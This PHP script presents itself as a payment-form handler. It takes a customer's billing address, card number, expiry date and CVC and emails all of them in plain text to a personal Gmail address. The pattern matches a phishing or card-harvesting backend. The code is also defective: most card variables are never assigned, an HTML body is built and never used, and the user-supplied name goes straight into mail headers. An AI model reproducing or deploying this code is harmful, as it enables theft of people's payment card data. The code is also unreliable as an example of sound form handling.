<?php
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

// Handle JSON payload
if ($_SERVER['CONTENT_TYPE'] === 'application/json') {
    $input = file_get_contents('php://input');
    $_POST = json_decode($input, true);
}

function sendEmail($post) {
    $name = filter_var($post['name'], FILTER_SANITIZE_STRING);
    $fromEmail = filter_var($post['email'], FILTER_SANITIZE_EMAIL);

    // Validate email
    if (!filter_var($fromEmail, FILTER_VALIDATE_EMAIL)) {
        return "Invalid email address.";
    }

    // Rest of the sanitization and validation...
    $to = 'habeebajani9@gmail.com';
    $subject = "Payment Process";
    $headers = "MIME-Version: 1.0\r\n";
    $headers .= "Content-type: text/html; charset=UTF-8\r\n";
    $headers .= "From: {$name} <{$fromEmail}>\r\n";
    $headers .= "Reply-To: {$fromEmail}\r\n";
// Construct email content
$fields = [
    "Billing address" => $address,
    "State" => $state,
    "City" => $city,
    "Zip-code" => $zipCode,
    "Card owner" => $name,
    "Card number" => $card_number,
    "Amount" => $amount_to_pay,
    "Card expiration year" => $card_expiration_year,
    "Card expiration month" => $card_expiration_month,
    "Card CVC" => $cvv,
];

$email_body = "You have received a new message:\n\n" . implode("\n", array_map(
    fn($key, $value) => "$key: $value",
    array_keys($fields),
    $fields
));

$html_body = "<h3>You have received a new message:</h3>";
foreach ($fields as $key => $value) {
    $html_body .= "<p><strong>$key:</strong> $value</p>";
}

// Send email
if (mail($to, $subject, $email_body, $headers)) {
    return "success";
} else {
    return "Failed to send email.";
}
}
if(isset($_POST['sendcard'])){
sendEmail($_POST);
}


?>
